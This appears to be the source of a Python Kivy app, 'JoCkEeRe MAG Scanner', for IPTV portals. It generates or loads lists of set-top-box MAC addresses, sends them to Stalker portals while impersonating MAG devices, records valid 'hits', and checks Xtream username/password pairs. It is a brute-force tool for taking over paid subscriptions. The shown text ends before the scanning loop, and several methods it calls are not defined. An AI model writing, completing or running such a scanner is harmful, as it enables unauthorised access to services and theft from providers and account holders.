#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
JoCkEeRe MAG Scanner v3.0
Supports: MAC Stalker, M3U File, M3U URL, Xtream Codes
"""

import os, re, time, random, json, queue, threading, logging
from datetime import date, datetime

# ==================== Kivy Config ====================
from kivy.config import Config
Config.set('graphics', 'resizable', False)
Config.set('graphics', 'width', '450')
Config.set('graphics', 'height', '800')

from kivy.app import App
from kivy.uix.boxlayout    import BoxLayout
from kivy.uix.gridlayout   import GridLayout
from kivy.uix.label        import Label
from kivy.uix.textinput    import TextInput
from kivy.uix.button       import Button
from kivy.uix.spinner      import Spinner
from kivy.uix.scrollview   import ScrollView
from kivy.uix.popup        import Popup
from kivy.uix.tabbedpanel  import TabbedPanel, TabbedPanelItem
from kivy.clock            import Clock
from kivy.core.window      import Window
from kivy.graphics         import Color, RoundedRectangle, Line
from kivy.uix.widget       import Widget
from kivy.utils            import platform as kivy_platform

Window.orientation = 'portrait'

import requests, warnings
warnings.filterwarnings('ignore')
logging.captureWarnings(True)
ses = requests.Session()

# ==================== Platform ====================
is_android = kivy_platform == 'android'
if is_android:
    try:
        from android.permissions import request_permissions, Permission
        from android.storage import primary_external_storage_path
        request_permissions([Permission.WRITE_EXTERNAL_STORAGE,
                             Permission.READ_EXTERNAL_STORAGE,
                             Permission.INTERNET])
        BASE_DIR = primary_external_storage_path()
    except Exception as e:
        BASE_DIR = "/sdcard"
else:
    BASE_DIR = "."

HITS_DIR    = os.path.join(BASE_DIR, "Hits", "JoCkEeRe")
COMBO_DIR   = os.path.join(BASE_DIR, "combo")
CONFIG_FILE = os.path.join(BASE_DIR, "Hits", "jockeere_config.json")
os.makedirs(HITS_DIR, exist_ok=True)
os.makedirs(COMBO_DIR, exist_ok=True)

nickn = "JoCkEeRe"

# ==================== Color Palette ====================
BG_DARK      = (0.04, 0.04, 0.08, 1)
BG_CARD      = (0.08, 0.08, 0.15, 1)
BG_CARD2     = (0.11, 0.11, 0.20, 1)
BG_INPUT     = (0.07, 0.07, 0.14, 1)
C_CYAN       = (0.0,  0.90, 1.0,  1)
C_PURPLE     = (0.60, 0.20, 1.0,  1)
C_PINK       = (1.0,  0.20, 0.60, 1)
C_GREEN      = (0.0,  0.90, 0.50, 1)
C_YELLOW     = (1.0,  0.85, 0.0,  1)
C_RED        = (1.0,  0.25, 0.25, 1)
C_WHITE      = (0.95, 0.95, 1.0,  1)
C_GRAY       = (0.45, 0.50, 0.60, 1)
C_ORANGE     = (1.0,  0.55, 0.0,  1)

BTN_SCAN     = (0.0,  0.55, 0.85, 1)
BTN_STOP     = (0.75, 0.10, 0.10, 1)
BTN_PAUSE    = (0.60, 0.40, 0.0,  1)
BTN_GREEN    = (0.0,  0.55, 0.30, 1)
BTN_PURPLE   = (0.40, 0.10, 0.75, 1)

# ==================== Helper Widgets ====================

class GlowCard(BoxLayout):
    def __init__(self, bg=None, radius=16, border_color=None, **kwargs):
        super().__init__(**kwargs)
        self._bg = bg or BG_CARD
        self._r  = radius
        self._bc = border_color
        with self.canvas.before:
            if self._bc:
                Color(*self._bc, 0.5)
                self._border = RoundedRectangle(size=self.size, pos=self.pos, radius=[self._r+1])
            Color(*self._bg)
            self._rect = RoundedRectangle(size=self.size, pos=self.pos, radius=[self._r])
        self.bind(size=self._upd, pos=self._upd)

    def _upd(self, *a):
        self._rect.size = self.size
        self._rect.pos  = self.pos
        if self._bc:
            self._border.size = (self.size[0]+2, self.size[1]+2)
            self._border.pos  = (self.pos[0]-1, self.pos[1]-1)


def lbl(text, size='14sp', color=C_WHITE, bold=False, halign='left',
         height=30, markup=True, **kwargs):
    t = f"[b]{text}[/b]" if bold else text
    l = Label(text=t, font_size=size, color=color, markup=markup,
               size_hint=(1, None), height=height,
               halign=halign, valign='middle', **kwargs)
    l.bind(size=lambda w, s: setattr(w, 'text_size', (s[0], None)))
    return l


def inp(hint='', multiline=False, height=42, **kwargs):
    return TextInput(
        hint_text=hint,
        background_color=BG_INPUT,
        foreground_color=C_CYAN,
        hint_text_color=(*C_GRAY[:3], 0.6),
        cursor_color=C_CYAN,
        font_size='15sp',
        padding=[12, 10, 12, 10],
        size_hint=(1, None),
        height=height,
        multiline=multiline,
        **kwargs
    )


def spin(values, text=None, height=42, **kwargs):
    return Spinner(
        text=text or values[0],
        values=values,
        font_size='14sp',
        background_color=BG_CARD2,
        color=C_CYAN,
        size_hint=(1, None),
        height=height,
        **kwargs
    )


def btn(text, bg=BTN_SCAN, fg=C_WHITE, height=46, font_size='15sp', **kwargs):
    b = Button(
        text=f"[b]{text}[/b]",
        markup=True,
        font_size=font_size,
        background_color=bg,
        color=fg,
        background_normal='',
        size_hint=(1, None),
        height=height,
        **kwargs
    )
    return b


def sp(h=8):
    return Widget(size_hint_y=None, height=h)


def divider():
    w = Widget(size_hint=(1, None), height=1)
    with w.canvas:
        Color(0.25, 0.25, 0.45, 0.6)
        w._line = Line(points=[0, 0, 0, 0], width=1)
    def _upd(widget, size):
        widget._line.points = [widget.x, widget.y, widget.x + size[0], widget.y]
    w.bind(size=_upd, pos=_upd)
    return w


# ==================== Stat Badge ====================
class StatBadge(GlowCard):
    def __init__(self, title, value='0', color=C_CYAN, **kwargs):
        super().__init__(bg=BG_CARD2, radius=12,
                         orientation='vertical',
                         padding=[8, 6, 8, 6],
                         spacing=2, **kwargs)
        self.val_lbl = lbl(value, size='22sp', color=color, bold=True,
                            halign='center', height=32)
        self.ttl_lbl = lbl(title, size='11sp', color=C_GRAY,
                            halign='center', height=18)
        self.add_widget(self.val_lbl)
        self.add_widget(self.ttl_lbl)

    def set(self, v):
        self.val_lbl.text = f"[b]{v}[/b]"


# ==================== Network Helpers ====================

def month_str(ay):
    m = {'jan':1,'feb':2,'mar':3,'apr':4,'may':5,'jun':6,
         'jul':7,'aug':8,'sep':9,'oct':10,'nov':11,'dec':12}
    return m.get(ay.strip()[:3].lower(), 1)

def tarih_clear(trh):
    try:
        ay  = trh.split(' ')[0]
        gun = trh.split(', ')[0].split(' ')[1]
        yil = trh.split(',')[1]
        d   = date(int(yil), int(month_str(ay)), int(gun))
        return int((time.mktime(d.timetuple()) - time.time()) / 86400)
    except:
        return 0

def vpnip(ip):
    try:
        r = ses.get(f"http://ip-api.com/json/{ip}?fields=status,country,city",
                    timeout=7, verify=False).json()
        if r.get("status") == "success":
            return f"{r.get('country','?')}/{r.get('city','?')}"
    except:
        pass
    return "?"

def randommac(prefix):
    return f"{prefix}%02X:%02X:%02X" % (
        random.randint(0,255), random.randint(0,255), random.randint(0,255))

def hea1(mac, ua, panel):
    return {"User-Agent": ua, "Referer": f"http://{panel}/c/",
            "Accept": "application/json,*/*;q=0.8",
            "Cookie": f"mac={mac}; stb_lang=en; timezone=Europe/Paris;",
            "Accept-Encoding": "gzip, deflate", "Connection": "Keep-Alive",
            "X-User-Agent": "Model: MAG254; Link: Ethernet"}

def hea2(mac, token, ua, panel):
    h = hea1(mac, ua, panel)
    h["Authorization"] = f"Bearer {token}"
    return h

def save_hit(text, panel):
    safe = panel.replace(':', '_').replace('/', '_')
    path = os.path.join(HITS_DIR, f"{safe}.txt")
    try:
        with open(path, "a", encoding="utf-8") as f:
            f.write(text + "\n\n")
    except Exception as e:
        print(f"Save error: {e}")

# ──────────────────────────────────────────
# Playlist Readers
# ──────────────────────────────────────────

def parse_m3u(content):
    channels, current = [], {}
    for line in content.strip().splitlines():
        line = line.strip()
        if line.startswith('#EXTINF'):
            current = {}
            m = re.search(r',(.+)$', line)
            if m: current['name'] = m.group(1).strip()
            for a in ['tvg-id','tvg-name','tvg-logo','group-title']:
                m2 = re.search(rf'{a}="([^"]*)"', line, re.I)
                if m2: current[a] = m2.group(1)
        elif line and not line.startswith('#') and current:
            current['url'] = line
            channels.append(current)
            current = {}
    return channels

def read_m3u_file(path):
    try:
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            return parse_m3u(f.read())
    except Exception as e:
        return []

def read_m3u_url(url, timeout=15):
    try:
        r = ses.get(url, headers={'User-Agent': 'VLC/3.0.0'}, timeout=timeout)
        return parse_m3u(r.text)
    except:
        return []

def read_xtream(host, user, passwd, timeout=15):
    host = host.rstrip('/')
    result = {'info': {}, 'live': [], 'error': None}
    try:
        r    = ses.get(f"{host}/player_api.php?username={user}&password={passwd}", timeout=timeout)
        data = r.json()
        ui   = data.get('user_info', {})
        si   = data.get('server_info', {})
        exp  = ui.get('exp_date')
        if exp and exp != 'null':
            try: exp = datetime.fromtimestamp(int(exp)).strftime('%Y-%m-%d')
            except: pass
        else: exp = 'Unlimited'
        result['info'] = {
            'username': ui.get('username', user),
            'password': ui.get('password', passwd),
            'status'  : ui.get('status', '?'),
            'exp_date': exp,
            'active'  : ui.get('active_connections', '?'),
            'max'     : ui.get('max_connections', '?'),
            'host'    : host,
        }
        streams = ses.get(
            f"{host}/player_api.php?username={user}&password={passwd}&action=get_live_streams",
            timeout=timeout).json()
        result['live'] = [
            {'name': s.get('name',''), 'id': s.get('stream_id',''),
             'url': f"{host}/live/{user}/{passwd}/{s.get('stream_id','')}.m3u8"}
            for s in streams
        ]
    except Exception as e:
        result['error'] = str(e)
    return result

def read_stalker(panel, mac, timeout=10):
    result = {'panel': panel, 'mac': mac, 'info': {}, 'channels': [], 'error': None}
    ua = "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3"
    try:
        r1    = ses.get(f"http://{panel}/portal.php?type=stb&action=handshake&token=&JsHttpRequest=1-xml",
                        headers=hea1(mac, ua, panel), timeout=timeout)
        token = r1.json().get('js', {}).get('token', '')
        r2    = ses.get(f"http://{panel}/portal.php?type=stb&action=get_profile&JsHttpRequest=1-xml",
                        headers=hea2(mac, token, ua, panel), timeout=timeout)
        js    = r2.json().get('js', {})
        result['info'] = {
            'mac'     : mac,
            'token'   : token,
            'status'  : js.get('status', ''),
            'exp_date': js.get('end_date', js.get('tariff_expired_date', '?')),
        }
    except Exception as e:
        result['error'] = str(e)
    return result

# ==================== Main Layout ====================

class ScannerLayout(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(orientation='vertical', padding=0, spacing=0, **kwargs)

        with self.canvas.before:
            Color(*BG_DARK)
            self._bg = RoundedRectangle(size=self.size, pos=self.pos, radius=[0])
        self.bind(size=lambda w, s: setattr(w._bg, 'size', s),
                  pos=lambda w, p: setattr(w._bg, 'pos', p))

        self._build_header()
        self._build_tabs()
        self._build_stats()
        self._build_log()
        self._build_controls()

        # State
        self.running      = False
        self.paused       = False
        self.hits         = 0
        self.checked      = 0
        self.total_macs   = 0
        self.start_time   = 0
        self.stop_event   = threading.Event()
        self.pause_event  = threading.Event()
        self.pause_event.set()
        self.update_queue = queue.Queue()
        self.worker_threads = []

        self.panel_host   = ""
        self.panel_choice = "1"
        self.bots         = 4
        self.mac_prefix   = "00:1A:79:"
        self.mac_list     = []
        self.combo_data   = None
        self.dsyno        = "0"
        self.output_mode  = "0"
        self.useragent    = ""
        self.uzmanm       = "portal.php"
        self.urib         = ""
        self.uzmanc       = ""

        Clock.schedule_interval(self.process_queue, 0.3)
        self.load_settings()

    # ──────── HEADER ────────
    def _build_header(self):
        hdr = GlowCard(orientation='horizontal', bg=(0.06, 0.04, 0.14, 1),
                       border_color=C_PURPLE, radius=0,
                       size_hint=(1, None), height=62,
                       padding=[16, 8, 16, 8], spacing=8)

        logo = lbl("⚡", size='28sp', color=C_CYAN, height=44,
                    size_hint=(None, None), width=40)
        title_box = BoxLayout(orientation='vertical', spacing=0)
        title_box.add_widget(lbl("JoCkEeRe MAG Scanner", size='17sp',
                                  color=C_CYAN, bold=True, height=26))
        title_box.add_widget(lbl("v3.0  ·  Multi-Protocol", size='11sp',
                                  color=C_PURPLE, height=18))

        self.status_dot = lbl("● IDLE", size='12sp', color=C_GRAY,
                               halign='right', height=44,
                               size_hint=(None, None), width=90)
        hdr.add_widget(logo)
        hdr.add_widget(title_box)
        hdr.add_widget(self.status_dot)
        self.add_widget(hdr)

    # ──────── TABS ────────
    def _build_tabs(self):
        tp = TabbedPanel(do_default_tab=False,
                          tab_width=108, tab_height=38,
                          size_hint=(1, None), height=320,
                          background_color=BG_DARK)

        self._tab_stalker = self._make_stalker_tab()
        self._tab_m3u     = self._make_m3u_tab()
        self._tab_xtream  = self._make_xtream_tab()
        self._tab_reader  = self._make_reader_tab()

        for tab in [self._tab_stalker, self._tab_m3u,
                    self._tab_xtream, self._tab_reader]:
            tp.add_widget(tab)

        tp.default_tab = self._tab_stalker
        self.add_widget(tp)

    def _tab_item(self, title, color=C_CYAN):
        t = TabbedPanelItem(text=f"[b]{title}[/b]",
                             markup=True,
                             background_color=BG_CARD2,
                             color=color,
                             font_size='13sp')
        return t

    def _scroll_pad(self):
        sv = ScrollView(size_hint=(1, 1))
        box = BoxLayout(orientation='vertical',
                         padding=[12, 10, 12, 10],
                         spacing=6, size_hint_y=None)
        box.bind(minimum_height=box.setter('height'))
        sv.add_widget(box)
        return sv, box

    # ── TAB: MAC Stalker ──
    def _make_stalker_tab(self):
        t = self._tab_item("🔍 STB", C_CYAN)
        sv, box = self._scroll_pad()

        box.add_widget(lbl("Panel Host:Port", size='13sp', color=C_GRAY, height=22))
        self.panel_input = inp("example.com:8080")
        box.add_widget(self.panel_input)
        box.add_widget(sp(4))

        row = BoxLayout(size_hint=(1, None), height=42, spacing=8)
        row.add_widget(lbl("Type", size='13sp', color=C_GRAY,
                            size_hint=(None, None), width=50, height=42))
        self.panel_type_spinner = spin(
            ["1-Standard","2-Ultra","3-RealBlue","4-Server",
             "5-Stalker","6-C/Server","7-C/Portal","8-BS.MSG",
             "9-Magload","10-PortalSTB","11-K/Portal",
             "12-Maglove","13-Magaccess","14-Portalmega","15-Powerfull"],
            height=42)
        row.add_widget(self.panel_type_spinner)
        box.add_widget(row)
        box.add_widget(sp(4))

        box.add_widget(divider())
        box.add_widget(sp(4))

        row2 = BoxLayout(size_hint=(1, None), height=42, spacing=8)
        self.mode_spinner = spin(["Random MAC","Combo File"], height=42)
        self.mode_spinner.bind(text=self._on_mode_change)
        row2.add_widget(self.mode_spinner)
        box.add_widget(row2)

        self.prefix_spinner = spin(
            ["00:1A:79:","00:26:99:","00:1C:C0:",
             "78:44:FD:","B4:A9:FC:","A4:11:62:"],
            height=42)
        box.add_widget(self.prefix_spinner)

        row3 = BoxLayout(size_hint=(1, None), height=42, spacing=8)
        row3.add_widget(lbl("MACs", size='13sp', color=C_GRAY,
                             size_hint=(None, None), width=55, height=42))
        self.mac_count_input = inp("30000", height=42,
                                    size_hint=(0.5, None))
        row3.add_widget(self.mac_count_input)
        row3.add_widget(lbl("Bots", size='13sp', color=C_GRAY,
                             size_hint=(None, None), width=45, height=42))
        self.bots_input = inp("4", height=42, size_hint=(0.3, None))
        row3.add_widget(self.bots_input)
        box.add_widget(row3)

        self.combo_btn = btn("📂 Load Combo", bg=BTN_PURPLE, height=40)
        self.combo_btn.bind(on_press=self.load_combo)
        self.combo_lbl = lbl("No combo loaded", size='12sp',
                               color=C_GRAY, height=20)
        box.add_widget(self.combo_btn)
        box.add_widget(self.combo_lbl)
        box.add_widget(sp(4))

        box.add_widget(divider())
        box.add_widget(sp(4))

        row4 = BoxLayout(size_hint=(1, None), height=42, spacing=8)
        row4.add_widget(lbl("Output", size='13sp', color=C_GRAY,
                             size_hint=(None, None), width=60, height=42))
        self.output_spinner = spin(["Save All","Hits Only","No Save"], height=42)
        row4.add_widget(self.output_spinner)
        box.add_widget(row4)

        t.content = sv
        return t

    def _on_mode_change(self, spinner, text):
        self.dsyno = "1" if "Combo" in text else "0"
        self.prefix_spinner.disabled = (self.dsyno == "1")

    # ── TAB: M3U ──
    def _make_m3u_tab(self):
        t = self._tab_item("📋 M3U", C_PURPLE)
        sv, box = self._scroll_pad()

        box.add_widget(lbl("M3U URL / File Path", size='13sp', color=C_GRAY, height=22))
        self.m3u_input = inp("http://example.com/playlist.m3u")
        box.add_widget(self.m3u_input)
        box.add_widget(sp(6))

        row = BoxLayout(size_hint=(1, None), height=44, spacing=8)
        b1 = btn("🔗 Load URL", bg=BTN_PURPLE, height=44)
        b1.bind(on_press=self._load_m3u_url)
        b2 = btn("📂 Load File", bg=(0.25, 0.25, 0.45, 1), height=44)
        b2.bind(on_press=self._load_m3u_file)
        row.add_widget(b1)
        row.add_widget(b2)
        box.add_widget(row)

        box.add_widget(sp(8))
        box.add_widget(divider())
        box.add_widget(sp(8))

        self.m3u_result = lbl("No playlist loaded", size='13sp',
                               color=C_GRAY, height=24)
        box.add_widget(self.m3u_result)

        self.m3u_scroll = ScrollView(size_hint=(1, None), height=120)
        self.m3u_list_box = BoxLayout(orientation='vertical',
                                       spacing=2, size_hint_y=None,
                                       padding=[4, 4, 4, 4])
        self.m3u_list_box.bind(minimum_height=self.m3u_list_box.setter('height'))
        self.m3u_scroll.add_widget(self.m3u_list_box)
        box.add_widget(self.m3u_scroll)

        t.content = sv
        return t

    def _load_m3u_url(self, *a):
        url = self.m3u_input.text.strip()
        if not url:
            self.m3u_result.text = "[color=#ff4444]Enter URL first[/color]"
            return
        self.m3u_result.text = "[color=#00ccff]Loading...[/color]"
        threading.Thread(target=self._do_load_m3u_url, args=(url,), daemon=True).start()

    def _do_load_m3u_url(self, url):
        channels = read_m3u_url(url)
        Clock.schedule_once(lambda dt: self._show_m3u(channels, f"URL: {len(channels)} channels"), 0)

    def _load_m3u_file(self, *a):
        path = self.m3u_input.text.strip()
        if not path:
            self.m3u_result.text = "[color=#ff4444]Enter file path[/color]"
            return
        channels = read_m3u_file(path)
        self._show_m3u(channels, f"File: {len(channels)} channels")

    def _show_m3u(self, channels, summary):
        self.m3u_result.text = f"[color=#00e680]{summary}[/color]"
        self.m3u_list_box.clear_widgets()
        for ch in channels[:50]:
            name  = ch.get('name', '?')
            group = ch.get('group-title', '')
            row = GlowCard(orientation='horizontal', bg=BG_CARD2, radius=8,
                            size_hint=(1, None), height=32,
                            padding=[8, 4, 8, 4], spacing=6)
            row.add_widget(lbl(f"[color=#00e6ff]{name}[/color]", size='12sp',
                                height=24))
            if group:
                row.add_widget(lbl(f"[color=#8855ff]{group}[/color]", size='11sp',
                                    halign='right', height=24))
            self.m3u_list_box.add_widget(row)
        if len(channels) > 50:
            self.m3u_list_box.add_widget(
                lbl(f"... and {len(channels)-50} more", size='12sp',
                     color=C_GRAY, height=22))

    # ── TAB: Xtream ──
    def _make_xtream_tab(self):
        t = self._tab_item("📡 Xtream", C_PINK)
        sv, box = self._scroll_pad()

        box.add_widget(lbl("Host URL", size='13sp', color=C_GRAY, height=22))
        self.xt_host = inp("http://example.com:8080")
        box.add_widget(self.xt_host)
        box.add_widget(sp(4))

        row = BoxLayout(size_hint=(1, None), height=42, spacing=8)
        row.add_widget(lbl("User", size='13sp', color=C_GRAY,
                            size_hint=(None, None), width=45, height=42))
        self.xt_user = inp("username", size_hint=(1, None), height=42)
        row.add_widget(self.xt_user)
        box.add_widget(row)

        row2 = BoxLayout(size_hint=(1, None), height=42, spacing=8)
        row2.add_widget(lbl("Pass", size='13sp', color=C_GRAY,
                             size_hint=(None, None), width=45, height=42))
        self.xt_pass = inp("password", password=True,
                            size_hint=(1, None), height=42)
        row2.add_widget(self.xt_pass)
        box.add_widget(row2)
        box.add_widget(sp(8))

        b = btn("⚡ Check Xtream", bg=BTN_PURPLE, height=46)
        b.bind(on_press=self._check_xtream)
        box.add_widget(b)
        box.add_widget(sp(8))
        box.add_widget(divider())
        box.add_widget(sp(8))

        self.xt_result = GlowCard(orientation='vertical', bg=BG_CARD2,
                                   radius=10, size_hint=(1, None), height=130,
                                   padding=[12, 8, 12, 8], spacing=4)
        self.xt_lines = [lbl("─── Xtream Result ───", size='12sp',
                              color=C_GRAY, height=20) for _ in range(6)]
        for l in self.xt_lines:
            self.xt_result.add_widget(l)
        box.add_widget(self.xt_result)

        t.content = sv
        return t

    def _check_xtream(self, *a):
        host = self.xt_host.text.strip()
        user = self.xt_user.text.strip()
        pwd  = self.xt_pass.text.strip()
        if not host or not user:
            return
        self.xt_lines[0].text = "[color=#00ccff]Checking...[/color]"
        threading.Thread(target=self._do_xtream,
                          args=(host, user, pwd), daemon=True).start()

    def _do_xtream(self, host, user, pwd):
        res = read_xtream(host, user, pwd)
        info = res.get('info', {})
        live = res.get('live', [])
        err  = res.get('error')
        def update(dt):
            if err:
                self.xt_lines[0].text = f"[color=#ff4444]Error: {err}[/color]"
                for l in self.xt_lines[1:]:
                    l.text = ""
                return
            colors = [C_CYAN, C_GREEN, C_YELLOW, C_PURPLE, C_WHITE, C_GRAY]
            data = [
                f"[b]Status:[/b]  {info.get('status','?')}",
                f"[b]User:[/b]    {info.get('username','?')}",
                f"[b]Pass:[/b]    {info.get('password','?')}",
                f"[b]Expiry:[/b]  {info.get('exp_date','?')}",
                f"[b]Conns:[/b]   {info.get('active','?')} / {info.get('max','?')}",
                f"[b]Live:[/b]    {len(live)} channels",
            ]
            for i, (line, color) in enumerate(zip(data, colors)):
                self.xt_lines[i].text  = line
                self.xt_lines[i].color = color
        Clock.schedule_once(update, 0)

    # ── TAB: Reader ──
    def _make_reader_tab(self):
        t = self._tab_item("📥 Reader", C_ORANGE)
        sv, box = self._scroll_pad()

        box.add_widget(lbl("Auto-Detect Reader", size='14sp',
                            color=C_ORANGE, bold=True, height=28))
        box.add_widget(lbl("Paste any source: M3U URL, Xtream URL, or MAC:PANEL",
                            size='12sp', color=C_GRAY, height=20))
        box.add_widget(sp(6))

        self.reader_input = inp("http://host:port/...", multiline=False)
        box.add_widget(self.reader_input)
        box.add_widget(sp(4))

        row = BoxLayout(size_hint=(1, None), height=42, spacing=8)
        row.add_widget(lbl("MAC", size='13sp', color=C_GRAY,
                            size_hint=(None, None), width=40, height=42))
        self.reader_mac = inp("00:1A:79:xx:xx:xx",
                               size_hint=(1, None), height=42)
        row.add_widget(self.reader_mac)
        box.add_widget(row)
        box.add_widget(sp(8))

        b = btn("🚀 Auto Read", bg=BTN_SCAN, height=46)
        b.bind(on_press=self._auto_read)
        box.add_widget(b)
        box.add_widget(sp(8))
        box.add_widget(divider())
        box.add_widget(sp(6))

        self.reader_out = TextInput(
            text="Results will appear here...",
            background_color=BG_INPUT,
            foreground_color=(*C_CYAN[:3], 0.9),
            font_size='13sp',
            readonly=True,
            size_hint=(1, None),
            height=140,
            padding=[10, 8],
        )
        box.add_widget(self.reader_out)

        t.content = sv
        return t

    def _auto_read(self, *a):
        src = self.reader_input.text.strip()
        mac = self.reader_mac.text.strip()
        if not src:
            self.reader_out.text = "Enter a source URL first."
            return
        self.reader_out.text = "Loading..."
        threading.Thread(target=self._do_auto_read,
                          args=(src, mac), daemon=True).start()

    def _do_auto_read(self, src, mac):
        out = ""
        try:
            if 'player_api' in src:
                m = re.search(r'username=([^&]+)&password=([^&]+)', src)
                host = src.split('/player_api')[0]
                if m:
                    res  = read_xtream(host, m.group(1), m.group(2))
                    info = res.get('info', {})
                    live = res.get('live', [])
                    out  = (f"=== XTREAM ===\n"
                            f"Status : {info.get('status','?')}\n"
                            f"User   : {info.get('username','?')}\n"
                            f"Pass   : {info.get('password','?')}\n"
                            f"Expiry : {info.get('exp_date','?')}\n"
                            f"Live   : {len(live)} channels\n")
            elif mac and ':' in mac and len(mac) >= 17:
                panel = src.replace('http://','').rstrip('/')
                res   = read_stalker(panel, mac)
                info  = res.get('info', {})
                out   = (f"=== STB STALKER ===\n"
                         f"MAC    : {info.get('mac','?')}\n"
                         f"Status : {info.get('status','?')}\n"
                         f"Expiry : {info.get('exp_date','?')}\n")
            elif src.endswith('.m3u') or src.endswith('.m3u8') or 'get.php' in src:
                chs = read_m3u_url(src)
                out = f"=== M3U URL ===\nChannels: {len(chs)}\n\n"
                out += "\n".join(
                    f"{i+1}. {c.get('name','?')} [{c.get('group-title','')}]"
                    for i, c in enumerate(chs[:30])
                )
                if len(chs) > 30:
                    out += f"\n... +{len(chs)-30} more"
            else:
                out = "Could not detect format.\nTry: M3U URL, Xtream player_api URL,\nor enter MAC address below."
        except Exception as e:
            out = f"Error: {e}"
        Clock.schedule_once(lambda dt: setattr(self.reader_out, 'text', out), 0)

    # ──────── STATS BAR ────────
    def _build_stats(self):
        bar = GlowCard(orientation='horizontal', bg=(0.06, 0.06, 0.12, 1),
                        border_color=C_PURPLE, radius=0,
                        size_hint=(1, None), height=76,
                        padding=[10, 8, 10, 8], spacing=8)

        self.stat_checked = StatBadge("CHECKED", color=C_CYAN)
        self.stat_hits    = StatBadge("HITS",    color=C_YELLOW)
        self.stat_speed   = StatBadge("MAC/S",   color=C_GREEN)
        self.stat_time    = StatBadge("TIME",    color=C_PURPLE, value="00:00")
        self.stat_pct     = StatBadge("PROG%",   color=C_PINK)

        for s in [self.stat_checked, self.stat_hits,
                  self.stat_speed, self.stat_time, self.stat_pct]:
            bar.add_widget(s)

        self.add_widget(bar)

    # ──────── LOG ────────
    def _build_log(self):
        log_card = GlowCard(orientation='vertical', bg=BG_CARD, radius=0,
                             size_hint=(1, 1), padding=[0, 0, 0, 0])

        hdr = BoxLayout(size_hint=(1, None), height=28,
                         padding=[12, 4, 12, 4])
        hdr.add_widget(lbl("▸ Live Log", size='12sp', color=C_PURPLE,
                            bold=True, height=20))
        self.current_mac = lbl("", size='11sp', color=C_GRAY,
                                halign='right', height=20)
        hdr.add_widget(self.current_mac)
        log_card.add_widget(hdr)
        log_card.add_widget(divider())

        self.log_scroll = ScrollView(size_hint=(1, 1))
        self.log_box    = BoxLayout(orientation='vertical',
                                     padding=[10, 6, 10, 6],
                                     spacing=3, size_hint_y=None)
        self.log_box.bind(minimum_height=self.log_box.setter('height'))
        self.log_scroll.add_widget(self.log_box)
        log_card.add_widget(self.log_scroll)
        self.add_widget(log_card)

    def add_log(self, text, hit=False, error=False):
        color = C_YELLOW if hit else (C_RED if error else C_WHITE)
        prefix = "🎯 " if hit else ("❌ " if error else "")
        ts = datetime.now().strftime('%H:%M:%S')
        l = Label(
            text=f"[color=#{int(color[0]*255):02x}{int(color[1]*255):02x}{int(color[2]*255):02x}]"
                 f"[{ts}] {prefix}{text}[/color]",
            markup=True,
            font_size='12sp',
            size_hint=(1, None),
            height=22,
            halign='left',
            valign='middle',
            text_size=(None, None),
        )
        l.bind(size=lambda w, s: setattr(w, 'text_size', (s[0], None)))
        self.log_box.add_widget(l)
        if len(self.log_box.children) > 120:
            self.log_box.remove_widget(self.log_box.children[-1])
        Clock.schedule_once(lambda dt: setattr(
            self.log_scroll, 'scroll_y', 0), 0.05)

    # ──────── CONTROLS ────────
    def _build_controls(self):
        ctrl = GlowCard(orientation='vertical', bg=(0.06, 0.04, 0.14, 1),
                         border_color=C_PURPLE, radius=0,
                         size_hint=(1, None), height=106,
                         padding=[10, 8, 10, 8], spacing=6)

        row1 = BoxLayout(size_hint=(1, None), height=46, spacing=8)
        self.start_btn = btn("▶  START SCAN", bg=BTN_SCAN, height=46, font_size='16sp')
        self.start_btn.bind(on_press=self.toggle_scan)
        self.pause_btn = btn("⏸  PAUSE", bg=BTN_PAUSE, height=46)
        self.pause_btn.bind(on_press=self.toggle_pause)
        self.pause_btn.disabled = True
        row1.add_widget(self.start_btn)
        row1.add_widget(self.pause_btn)
        ctrl.add_widget(row1)

        row2 = BoxLayout(size_hint=(1, None), height=38, spacing=8)
        b_hits = btn("📂 Hits Folder", bg=(0.15, 0.15, 0.28, 1), height=38)
        b_hits.bind(on_press=lambda *a: self.add_log(f"Hits: {HITS_DIR}"))
        b_clear = btn("🗑 Clear Log", bg=(0.18, 0.08, 0.08, 1), height=38)
        b_clear.bind(on_press=lambda *a: self.log_box.clear_widgets())
        row2.add_widget(b_hits)
        row2.add_widget(b_clear)
        ctrl.add_widget(row2)

        self.add_widget(ctrl)

    # ──────── SETTINGS ────────
    def save_settings(self):
        try:
            data = {
                'panel'   : self.panel_input.text,
                'panel_type': self.panel_type_spinner.text,
                'bots'    : self.bots_input.text,
                'prefix'  : self.prefix_spinner.text,
                'mac_count': self.mac_count_input.text,
            }
            with open(CONFIG_FILE, 'w') as f:
                json.dump(data, f)
        except:
            pass

    def load_settings(self):
        try:
            with open(CONFIG_FILE, 'r') as f:
                data = json.load(f)
            self.panel_input.text             = data.get('panel', '')
            self.panel_type_spinner.text      = data.get('panel_type', self.panel_type_spinner.values[0])
            self.bots_input.text              = data.get('bots', '4')
            self.prefix_spinner.text          = data.get('prefix', self.prefix_spinner.values[0])
            self.mac_count_input.text         = data.get('mac_count', '30000')
        except:
            pass

    # ──────── COMBO FILE ────────
    def load_combo(self, *a):
        popup_box = BoxLayout(orientation='vertical', spacing=8, padding=12)
        path_inp  = inp(COMBO_DIR, height=40)
        popup_box.add_widget(lbl("Combo File Path:", size='13sp',
                                  color=C_GRAY, height=24))
        popup_box.add_widget(path_inp)

        def do_load(*x):
            p = path_inp.text.strip()
            try:
                with open(p, 'r', encoding='utf-8', errors='ignore') as f:
                    raw = [l.strip() for l in f if l.strip()]
                self.mac_list  = raw
                self.combo_path = p
                self.combo_lbl.text = f"Loaded: {len(raw)} MACs"
                self.add_log(f"Combo loaded: {len(raw)} entries")
            except Exception as e:
                self.combo_lbl.text = f"Error: {e}"
            popup.dismiss()

        load_btn = btn("Load", bg=BTN_SCAN, height=40)
        load_btn.bind(on_press=do_load)
        popup_box.add_widget(load_btn)
        popup = Popup(title="Load Combo", content=popup_box,
                       size_hint=(0.9, None), height=200)
        popup.open()

    # ──────── SCAN CONTROL ────────
    def toggle_scan(self, *a):
        if self.running:
            self.stop_scan()
        else:
            self.start_scan()

    def stop_scan(self):
        self.running = False
        self.paused  = False
        self.stop_event.set()
        self.pause_event.set()
